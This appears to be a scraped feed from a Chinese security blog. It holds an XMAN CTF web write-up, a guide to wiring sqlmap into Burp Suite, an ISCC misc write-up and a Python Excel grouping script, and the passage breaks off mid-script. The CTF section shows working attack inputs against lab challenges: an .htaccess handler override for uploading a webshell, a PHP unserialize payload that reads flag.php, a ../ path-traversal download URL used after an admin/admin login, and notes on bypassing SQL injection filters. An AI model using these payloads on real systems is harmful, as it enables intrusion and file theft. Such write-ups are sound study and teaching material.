<p>题目直接给了源代码，前几天刚做过的parse_str 变量覆盖漏洞，parse_str会将传入的字符串解析成php变量，这里构造get请求<code>?b=a[0]=mCDemCDe</code>，即可拿到flag<br><code>XMAN{A_sTr_covcderd_t3st_you_oW?}</code></p>
<h2 id="urldecode"><a href="#urldecode" class="headerlink" title="urldecode"></a>urldecode</h2><p>看题目提示了url编码，hackbar里点了两次urlencode就getflag了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7772/?me=%25%35%38%25%34%64%25%34%31%25%34%65</div></pre></td></tr></table></figure></p>
<p>flag:<code>XMAN{UrlDeCode_CooL_yOu_u0D3rSta9D!}</code></p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>这道题是赛后做出来的，前面各种上传都没有成功，后来听人说是<code>.htaccess上传</code>，于是学习了一波，上传一个构造过的<code>.htaccess</code>文件，就可以指定后缀为<code>xxxx</code>的文件解析成php，再上传一个<code>xxxx后缀</code>的文件即可getshell，然后菜刀连接拿下flag,<code>.htaccess</code>文件如下:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> "<span class="attr">xiha</span>"&gt;</span></div><div class="line">SetHandler application/x-httpd一php</div><div class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p>跟着题目提示 <code>?code=1 --&gt;flag.php--&gt; help.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileClass</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $filename = <span class="string">'error.log'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>经典的php反序列化，构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?code=O:9:&quot;FileClass&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>即可读取<code>flag.php</code>文件,flag:<code>XMAN{UUNser1AL1Z3_XMAN__0)(0}</code></p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p><code>index.php~</code> 有<code>index.php</code>的源代码，</p>
<p>考察的是php几个弱类型还有函数的绕过漏洞，ISCC2017中做过类似的题，所以手快一血了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$a=<span class="number">0</span>;</div><div class="line">$b=<span class="number">0</span>;</div><div class="line">$c=<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'aaa'</span>]))</div><div class="line">&#123;</div><div class="line">        $aaa = $_GET[<span class="string">'aaa'</span>];</div><div class="line">        $aaa==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">switch</span> ($aaa)</div><div class="line">        &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                $a=<span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">$bbb=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'bbb'</span>]);</div><div class="line"><span class="keyword">if</span>(is_array($bbb))&#123;</div><div class="line">    is_numeric(@$bbb[<span class="string">"ccc"</span>])?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">if</span>(@$bbb[<span class="string">"ccc"</span>])&#123;</div><div class="line">        ($bbb[<span class="string">"ccc"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(is_array(@$bbb[<span class="string">"ddd"</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(count($bbb[<span class="string">"ddd"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($bbb[<span class="string">"ddd"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"Emmm..."</span>);</div><div class="line">        $eee = array_search(<span class="string">"XMAN"</span>, $bbb[<span class="string">"ddd"</span>]);</div><div class="line">        $eee===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">        <span class="keyword">foreach</span>($bbb[<span class="string">"ddd"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">            $val===<span class="string">"XMAN"</span>?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $c=<span class="number">1</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c)&#123;</div><div class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>要让a,b,c三个变量等1才能拿到flag<br>于是构造<code>?aaa=0&amp;bbb={&quot;ccc&quot;:&quot;2018a&quot;,&quot;ddd&quot;:[[],0]}</code><br>总解一下几个绕过的点：</p>
<ul>
<li><code>($bbb[&quot;ccc&quot;]&gt;2017)</code>:当<code>$bbb[&quot;ccc&quot;]</code>为<code>&quot;2018a&quot;</code>时会变成<code>2018</code>，即可绕过</li>
<li><code>$eee = array_search(&quot;XMAN&quot;, $bbb[&quot;ddd&quot;]);</code>因为 array_search    函数没有加第三个参数true，所以是弱类型的比较,<code>XMAN</code>会变成0,于是构造<code>&quot;ddd&quot;:[[],0]</code> ,就变成<code>array_search(0, [[],0]);</code>返回true</li>
</ul>
<h2 id="download"><a href="#download" class="headerlink" title="download"></a>download</h2><p>Codiad的本地文件包含漏洞，比赛的时候一直没包含成功，后来发现是我没登录</p>
<p>弱口令 <code>admin</code> <code>admin</code>，登陆之后访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7775/components/filemanager/download.php?path=../../../../var/www/flag.txt&amp;amp;amp;type=undefined</div></pre></td></tr></table></figure></p>
<p>就能拿到flag，一航大佬挖到了0day还申请了CVE，膜一下</p>
<h2 id="CTF用户登录"><a href="#CTF用户登录" class="headerlink" title="CTF用户登录"></a>CTF用户登录</h2><p>一道坑题，盲注，空格过滤了用<code>%0a</code>代替，逗号过滤了用<code>from for</code>代替<br>最后的flag是<code>ctf_users</code>中flag用户的密码解<code>base64</code><br><code>XMAN{DO_you_l1ke_sqlmap_sqlmap}</code><br>到很后面才放的hint <code>flag在ctf_users表里</code>，我在ctf_flags表里盲注了半天，网速还慢，就很难受。</p>
<h2 id="Welcome2IRC"><a href="#Welcome2IRC" class="headerlink" title="Welcome2IRC"></a>Welcome2IRC</h2><p>irc连接就有flag了，签到题</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;variacover&quot;&gt;&lt;a href=&quot;#variacover&quot; class=&quot;headerlink&quot; title=&quot;variacover&quot;&gt;&lt;/a&gt;variacover&lt;/h2&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="php" scheme="https://www.codemonster.cn/tags/php/"/>
    
      <category term="文件包含" scheme="https://www.codemonster.cn/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
      <category term="上传" scheme="https://www.codemonster.cn/tags/%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="SQL注入" scheme="https://www.codemonster.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="反序列化" scheme="https://www.codemonster.cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="盲注" scheme="https://www.codemonster.cn/tags/%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>渗透神器合体：在BurpSuite中集成Sqlmap</title>
    <link href="https://www.codemonster.cn/2017/07/13/burpSuite-add-sqlmap/"/>
    <id>https://www.codemonster.cn/2017/07/13/burpSuite-add-sqlmap/</id>
    <published>2017-07-13T02:44:25.000Z</published>
    <updated>2018-05-04T07:47:50.015Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接：<a href="http://www.freebuf.com/sectool/45239.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/45239.html</a><br><a id="more"></a><br>首先安装sqlmap，传送门：<a href="http://sqlmap.org/" target="_blank" rel="noopener">http://sqlmap.org/</a><br>将sqlmap.py加入到path中（在cmd中输入sqlmap.py不会报找不到文件）<br>下载依赖的jar包： <code>commons-io-2.4.jar</code>，<br>配置路径为：<code>extender--&gt;options--&gt;Java Environment</code>，选择该jar包所在目录</p>
<p>下载<code>sqlmap4burp</code>：<br>github: <a href="https://github.com/difcareer/sqlmap4burp" target="_blank" rel="noopener">https://github.com/difcareer/sqlmap4burp</a><br>编译此项目为单独的一个jar文件（编译前先导入所需的jar包，<code>commons-lang3</code>和<code>commons-io</code>），添加到burpsuite的java插件中，<br>配置路径为：extender–&gt;extentions–&gt;add<br>之后你将会看到在主页面中会新增一个tab，名字叫做Sqlmap</p>
<p>插件原理是将目标请求的数据存放到临时文件中，然后调用<code>&quot;sqlmap.py -r $file&quot;</code>来启动对请求的sql注入检测 在Sqlmap tab中，你可以配置sqlmap除 -r外的其他参数，比如：<br>加入配置中写：<code>&quot;--level 3&quot;</code>,真实执行时是：<code>sqlmap.py -r $file --level 3</code><br>回到burpsuite主页面，在任何请求连接上右键，会看到新增<code>&quot;send to Sqlmap&quot;</code>，点击后会开启cmd窗口，针对此请求进行sql注入检测</p>
<p><img src="/img/burp+sqlmap.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考链接：&lt;a href=&quot;http://www.freebuf.com/sectool/45239.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.freebuf.com/sectool/45239.html&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="burpsuite" scheme="https://www.codemonster.cn/tags/burpsuite/"/>
    
      <category term="sqlmap" scheme="https://www.codemonster.cn/tags/sqlmap/"/>
    
      <category term="插件" scheme="https://www.codemonster.cn/tags/%E6%8F%92%E4%BB%B6/"/>
    
      <category term="工具" scheme="https://www.codemonster.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>2017 ISCC Basic WriteUp</title>
    <link href="https://www.codemonster.cn/2017/06/26/2017-iscc-basic-writeup/"/>
    <id>https://www.codemonster.cn/2017/06/26/2017-iscc-basic-writeup/</id>
    <published>2017-06-26T05:29:39.000Z</published>
    <updated>2018-05-04T07:47:50.011Z</updated>
    
    <content type="html"><![CDATA[<p>由于网站备案原因，博客停止更新了一个月，接下来会陆续把中间积累下的比赛writeup和学习经验补上。<br><a id="more"></a></p>
<h2 id="Basic-1-Wheel-Cipher-（50）"><a href="#Basic-1-Wheel-Cipher-（50）" class="headerlink" title="Basic 1 Wheel Cipher （50）"></a>Basic 1 Wheel Cipher （50）</h2><p>加密表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">ZWAXJGDLUBVIQHKYPNTCRMOSFE</div><div class="line">KPBELNACZDTRXMJQOYHGVSFUWI</div><div class="line">BDMAIZVRNSJUWFHTEQGYXPLOCK</div><div class="line">RPLNDVHGFCUKTEBSXQYIZMJWAO</div><div class="line">IHFRLABEUOTSGJVDKCPMNZQWXY</div><div class="line">AMKGHIWPNYCJBFZDRUSLOQXVET</div><div class="line">GWTHSPYBXIZULVKMRAFDCEONJQ</div><div class="line">NOZUTWDCVRJLXKISEFAPMYGHBQ</div><div class="line">XPLTDSRFHENYVUBMCQWAOIKZGJ</div><div class="line">UDNAJFBOWTGVRSCZQKELMXYIHP</div><div class="line">MNBVCXZQWERTPOIUYALSKDJFHG</div><div class="line">LVNCMXZPQOWEIURYTASBKJDFHG</div><div class="line">JZQAWSXCDERFVBGTYHNUMKILOP</div></pre></td></tr></table></figure></p>
<p>密钥为：<code>2，3，7，5，13,12,9，1，8，10，4，11，6</code><br><br>密文为：<code>NFQKSEVOQOFNP</code><br><br>新神告诉我这是<br><a href="https://en.wikipedia.org/wiki/Jefferson_disk" target="_blank" rel="noopener">杰弗逊轮盘</a><br>编写python脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># by: CodeMonster</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line">s=[<span class="string">"ZWAXJGDLUBVIQHKYPNTCRMOSFE"</span>,<span class="string">"KPBELNACZDTRXMJQOYHGVSFUWI"</span>,<span class="string">"BDMAIZVRNSJUWFHTEQGYXPLOCK"</span>,<span class="string">"RPLNDVHGFCUKTEBSXQYIZMJWAO"</span>,<span class="string">"IHFRLABEUOTSGJVDKCPMNZQWXY"</span>,<span class="string">"AMKGHIWPNYCJBFZDRUSLOQXVET"</span>,<span class="string">"GWTHSPYBXIZULVKMRAFDCEONJQ"</span>,<span class="string">"NOZUTWDCVRJLXKISEFAPMYGHBQ"</span>,<span class="string">"XPLTDSRFHENYVUBMCQWAOIKZGJ"</span>,<span class="string">"UDNAJFBOWTGVRSCZQKELMXYIHP"</span>,<span class="string">"MNBVCXZQWERTPOIUYALSKDJFHG"</span>,<span class="string">"LVNCMXZPQOWEIURYTASBKJDFHG"</span>,<span class="string">"JZQAWSXCDERFVBGTYHNUMKILOP"</span>]</div><div class="line">num=[<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">6</span>]</div><div class="line"></div><div class="line">a=<span class="string">"NFQKSEVOQOFNP"</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">26</span>):</div><div class="line">    flag=<span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(num)):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">26</span>):</div><div class="line">            <span class="keyword">if</span> a[i]==s[num[i]<span class="number">-1</span>][j]:</div><div class="line">                <span class="keyword">if</span>  j-k&amp;gt;=<span class="number">0</span>:</div><div class="line">                    flag=flag+s[num[i]<span class="number">-1</span>][j-k]</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    flag=flag+s[num[i]<span class="number">-1</span>][j+<span class="number">26</span>-k]</div><div class="line">                <span class="keyword">break</span></div><div class="line">    <span class="keyword">print</span> flag</div></pre></td></tr></table></figure></p>
<p>运行后找到最像flag的一条，flag为 <code>FIREINTHEHOLE</code></p>
<p><img src="/img/2017iscc1.jpg" alt=""></p>
<h2 id="Basic-2-你猜猜。。-（100）"><a href="#Basic-2-你猜猜。。-（100）" class="headerlink" title="Basic 2 你猜猜。。 （100）"></a>Basic 2 你猜猜。。 （100）</h2><p>打开里面是这样一段代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">504B03040A0001080000626D0A49F4B5091F1E0000001200000008000000666C61672E7478746C9F170D35D0A45826A03E161FB96870EDDFC7C89A11862F9199B4CD78E7504B01023F000A0001080000626D0A49F4B5091F1E00000012000000080024000000000000002000000000000000666C61672E7478740A0020000000000001001800AF150210CAF2D1015CAEAA05CAF2D1015CAEAA05CAF2D101504B050600000000010001005A000000440000000000`&lt;/pre&gt;</div></pre></td></tr></table></figure></p>
<p>看到504B0304，很明显的zip压缩文件头，粘贴到winhex保存为zip文件，zip里有个<code>flag.txt</code>文件</p>
<p>但是有密码，爆破得到密码123456，flag为<code>daczcasdqwdcsdzasd</code></p>
<h2 id="Basic-3-神秘图片-（100）"><a href="#Basic-3-神秘图片-（100）" class="headerlink" title="Basic 3 神秘图片 （100）"></a>Basic 3 神秘图片 （100）</h2><p>给了一张png的图片，直接用<code>ExtractPNG.exe</code>工具，从图片中提取出了flag，flag为<code>goodlcuk</code></p>
<h2 id="Basic-4-告诉你个秘密-（100）"><a href="#Basic-4-告诉你个秘密-（100）" class="headerlink" title="Basic 4 告诉你个秘密 （100）"></a>Basic 4 告诉你个秘密 （100）</h2><p>给了这样一段东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">636A56355279427363446C4A49454A7154534230526D684356445A31614342354E326C4B4946467A5769426961453067</div></pre></td></tr></table></figure></p>
<p>16进制转ascii，然后再base64解码得到<code>r5yG lp9I BjM tFhB T6uh y7iJ QsZ bhM</code><br>这里卡了好久，后来发现键盘中 r5yG圈着T，lp9I圈着O，以此类推，flag为<code>TONGYUAN</code></p>
<h2 id="Basic-5-二维码"><a href="#Basic-5-二维码" class="headerlink" title="Basic 5 二维码"></a>Basic 5 二维码</h2><p>扫描二维码提示flag是路由器密码<br>binwalk分析二维码发现隐藏了一个压缩文件，分离出来后看到里面有两个文件，一个cap，一个破解记录<br>爆破zip密码得到密码，解压后根据破解记录的提示，路由器密码前四位为ISCC，后四位大写字母加数字。<br>用kali自带的aircrack-ng进行爆破<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aircrack-ng wifi.cap -w dic.txt</div></pre></td></tr></table></figure></p>
<p>其中dic.txt是字典，wifi.cap就是那个cap文件</p>
<p><img src="/img/2017iscc2.jpg" alt=""></p>
<p>爆破出路由器密码，所以flag为 <code>ISCC16BA</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于网站备案原因，博客停止更新了一个月，接下来会陆续把中间积累下的比赛writeup和学习经验补上。&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="MISC" scheme="https://www.codemonster.cn/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>EXCEL学生随机分组算法实现（python版）</title>
    <link href="https://www.codemonster.cn/2017/05/07/pyhon-excel-assigned-students/"/>
    <id>https://www.codemonster.cn/2017/05/07/pyhon-excel-assigned-students/</id>
    <published>2017-05-07T12:50:09.000Z</published>
    <updated>2018-05-04T07:47:50.016Z</updated>
    
    <content type="html"><![CDATA[<h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><ul>
<li>算法集中分在2组，就是W老师和Y老师那两组，</li>
<li>指导老师不能答辩自己指导的学生。</li>
<li><p>每个指导老师的学生最好不要扎堆（小于等于2）</p>
<a id="more"></a>
<h2 id="算法思路"><a href="#算法思路" class="headerlink" title="算法思路"></a>算法思路</h2></li>
<li><p>把所有学生分配到七个组中，每一组有26个空位填补学生</p>
</li>
<li>excel每一行学生读取进来，判断“毕业设计题目”是否包含关键词“算法”<ul>
<li>若包含关键词，则进行分配，<ul>
<li>分配规则：<code>random（W组空位*100+Y组空位*100+其他组空位之和）</code>生成一个随机数</li>
<li>判断落在哪个区间之中，</li>
<li>若该学生指导老师等于这个组的老师、或指导老师在该组的学生大于2、或该组人数已满26</li>
<li>则重新生成随机数</li>
<li>否则学生放入该组，该组剩余空位减1</li>
</ul>
</li>
</ul>
</li>
<li>分配“毕业设计题目”不包含“算法”的学生<ul>
<li>分配规则：random（所有组空位之和）生成一个随机数</li>
<li>判断落在哪个区间之中，</li>
<li>若该学生指导老师等于这个组的老师、或指导老师在该组的学生大于2、或该组人数已满26</li>
<li>则重新生成随机数</li>
<li>否则学生放入该组，该组剩余空位减1</li>
</ul>
</li>
</ul>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><p>考虑到要对excel进行读写，原来想用VBS实现，但是没有学过，实现成本太高了，发现python有对excel操作的现成的库，于是就直接拿过来用</p>
<h3 id="0x00-xlrd模块与xlwt的安装"><a href="#0x00-xlrd模块与xlwt的安装" class="headerlink" title="0x00 xlrd模块与xlwt的安装"></a>0x00 xlrd模块与xlwt的安装</h3><p>xlrd模块是用来读取excel表格的，<br>xlwt模块用来生成新的excel表格<br>安装方法也很简单，在有pip的windows下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pip install xlrd</div><div class="line">pip install xlwt</div></pre></td></tr></table></figure>
<h3 id="0x01-xlrd模块"><a href="#0x01-xlrd模块" class="headerlink" title="0x01 xlrd模块"></a>0x01 xlrd模块</h3><ol>
<li>导入模块<br><code>import xlrd</code></li>
<li>打开Excel文件读取数据<br><code>data = xlrd.open_workbook(&#39;excelFile.xls&#39;)</code></li>
<li>使用技巧<br>获取一个工作表<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">table = data.sheets()[<span class="number">0</span>] <span class="comment">#通过索引顺序获取</span></div><div class="line">table = data.sheet_by_index(<span class="number">0</span>) <span class="comment">#通过索引顺序获取</span></div><div class="line">table = data.sheet_by_name(<span class="string">u'Sheet1'</span>) <span class="comment">#通过名称获取</span></div><div class="line"><span class="comment">#获取整行和整列的值（数组）</span></div><div class="line">table.row_values(i)</div><div class="line">table.col_values(i)</div><div class="line"><span class="comment">#获取行数和列数</span></div><div class="line">nrows = table.nrows</div><div class="line">ncols = table.ncols</div><div class="line"><span class="comment">#循环行列表数据</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(nrows ):</div><div class="line">    <span class="keyword">print</span> table.row_values(i)</div></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="0x02-xlwt模块"><a href="#0x02-xlwt模块" class="headerlink" title="0x02 xlwt模块"></a>0x02 xlwt模块</h3><ol>
<li>导入模块<br><code>import xlwt</code></li>
<li>创建excel<br><code>workbook = xlwt.Workbook(encoding = &#39;ascii&#39;)</code></li>
<li>创建表<br><code>worksheet = workbook.add_sheet(&#39;Sheet1&#39;)</code></li>
<li>往单元格内写入内容<br><code>worksheet.write(0, 0, label = &#39;Row 0, Column 0 Value&#39;)</code></li>
<li>保存<br><code>workbook.save(&#39;Excel.xls&#39;)</code></li>
</ol>
<h3 id="0x03-实现算法"><a href="#0x03-实现算法" class="headerlink" title="0x03 实现算法"></a>0x03 实现算法</h3><p>实现过程遇到最坑的问题就是编码了，utf-8和gbk各种坑，各种乱码，最后全部采用gbk<br>然后读取的有些单元格是浮点型，不能转换编码类型，加个特殊判断就行，实现代码如下，算法不算复杂，需要的是耐心和细节把握<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment"># -*- coding: gbk -*-</span></div><div class="line"><span class="comment"># By CodeMonster</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> xlrd</div><div class="line"><span class="keyword">import</span> xlwt</div><div class="line"></div><div class="line">data = xlrd.open_workbook(<span class="string">'test.xls'</span>)  <span class="comment">#读取excel</span></div><div class="line">table = data.sheets()[<span class="number">0</span>]               <span class="comment">#读取第一个表</span></div><div class="line"></div><div class="line">nrows = table.nrows  <span class="comment">#读取行数</span></div><div class="line">ncols = table.ncols  <span class="comment">#读取列数</span></div><div class="line"></div><div class="line">teacher=[<span class="string">"xxx"</span>，<span class="string">"xxx"</span>，<span class="string">"xxx"</span>，<span class="string">"xxx"</span>,<span class="string">"xxx"</span>,<span class="string">"xxx"</span>,<span class="string">"xxx"</span>]</div><div class="line">mat=[<span class="number">26</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>)]   <span class="comment">#生成空位数组</span></div><div class="line">key=<span class="string">"算法"</span>                   <span class="comment">#关键词：算法</span></div><div class="line">grp1=<span class="number">5</span>                       <span class="comment">#W组</span></div><div class="line">grp2=<span class="number">6</span>                       <span class="comment">#Y组</span></div><div class="line">stu=[[<span class="string">''</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(ncols+<span class="number">1</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">7</span>*<span class="number">27</span>)]   <span class="comment">#生成空表</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(nrows<span class="number">-1</span>):</div><div class="line">	<span class="keyword">if</span> key <span class="keyword">in</span> table.row_values(i+<span class="number">1</span>)[<span class="number">4</span>].encode(<span class="string">"gbk"</span>):   <span class="comment">#如果包含关键字</span></div><div class="line">		s=mat[grp1]*<span class="number">100</span>+mat[grp2]*<span class="number">100</span></div><div class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">			s+=mat[j]</div><div class="line">		<span class="keyword">while</span> <span class="number">1</span>==<span class="number">1</span>:</div><div class="line">			num=random.randint(<span class="number">0</span>,s<span class="number">-1</span>)</div><div class="line">			<span 